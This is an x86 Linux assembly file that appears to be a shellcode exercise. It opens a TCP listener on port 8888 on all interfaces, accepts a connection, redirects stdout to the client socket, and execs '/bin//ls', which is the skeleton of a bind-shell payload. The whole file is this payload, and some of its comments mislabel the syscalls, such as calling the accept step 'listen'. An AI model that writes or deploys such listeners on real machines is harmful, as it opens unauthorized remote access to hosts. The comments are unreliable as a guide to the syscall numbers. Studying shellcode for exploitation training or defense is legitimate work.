;Author:   evoche
;License:  GPL

global _start

section .text
	
;use this as the program entry point
_start:

	;zero registers
	xor eax,eax
	xor ebx,ebx
	xor ecx,ecx
	xor edx,edx
	xor esi,esi
	
	;eax -> sys_socketcall
	;ebx -> socket function
	;ecx -> arguments
	
	;***Socket***
	;int srvSoc = socket(AF_INET, SOCK_STREAM, 0);
	mov al, 0x66			;102 is socketcall number
	inc ebx					;socket system call = 1
	push esi				;3rd arg - protocol - 0
	push 0x1				;2nd arg - socket_type - SOCK_STREAM
	push 0x2				;1st arg - socket_family - AF_INET     
	mov ecx,esp             ;load the arguments pointer into ecx
	int 0x80                ;execute
	mov edx,eax             ;transfer srvSoc fd to edx

	;***Bind***
	;bind(srvSoc, (struct sockaddr *) &srvFd, 16);
	mov al, 0x66			;102 is socketcall number
	inc ebx					;bind system call = 2
							;start to build the struc
	push esi				;srvFd.sin_addr.s_addr = htonl(INADDR_ANY);			//accepts connections to all the IPs of the machine
	push word 0xB822		;srvFd.sin_port = htons(8888);						//port number
	push word 0x2;			;srvFd.sin_family = AF_INET;						//family for IP address
	mov ecx,esp				;save address of struct
	push 0x10				;3rd arg - size of struct = 16
	push ecx				;2nd arg - pointer to sockaddr struct
	push edx				;1st arg - socket fd
	mov ecx,esp             ;load the arguments pointer into ecx
	int 0x80                ;execute

	;***Listen***
	;listen(srvSoc, 1);
	mov al, 0x66			;102 is socketcall number
	inc ebx
	inc ebx					;listen system call = 4
	push 0x1				;max number of connections
	push edx				;socket fd
	mov ecx,esp             ;load the arguments pointer into ecx
	int 0x80                ;execute

	;***Accept***	
	;int clientSoc = accept(srvSoc, NULL, NULL);
	mov al, 0x66			;102 is socketcall number
	inc ebx					;listen system call = 4
	push esi				;type
	push esi				;protocol				
	push edx				;socket fd
	mov ecx,esp             ;load the arguments pointer into ecx
	int 0x80                ;execute
	mov edx,eax             ;transfer clientSoc fd to edx

	;***Dup2***
	;dup2(clientSoc, 1);
	mov al, 0x3F			;63 dup2 system call number
	mov ebx, edx			;client fd
	push 0x1 
	pop ecx					;stdout redirect
	int 0x80				;execute	


	;***Execve*** - got directly from notes
	xor eax, eax
	push eax
	push 0x736c2f2f
	push 0x6e69622f
	mov ebx, esp
	push eax
	mov edx, esp
	push ebx
	mov ecx, esp
	mov al, 11
	int 0x80
	



